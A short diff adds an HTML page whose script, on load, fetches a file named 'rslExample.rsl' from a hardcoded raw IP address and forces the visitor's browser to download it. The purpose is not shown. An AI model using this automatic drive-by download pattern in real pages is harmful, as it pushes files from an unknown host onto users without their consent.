@@ -1,0 +1,13 @@
+<html>
+    <script>
+        fetch('http://1.116.116.112/rslExample.rsl').then(res => res.blob().then(blob => {
+            var a = document.createElement('a');
+            var url = window.URL.createObjectURL(blob);
+            var filename = 'rslExample.rsl';
+            a.href = url;
+            a.download = filename;
+            a.click();
+            window.URL.revokeObjectURL(url);
+        }))
+    </script>
+</html>
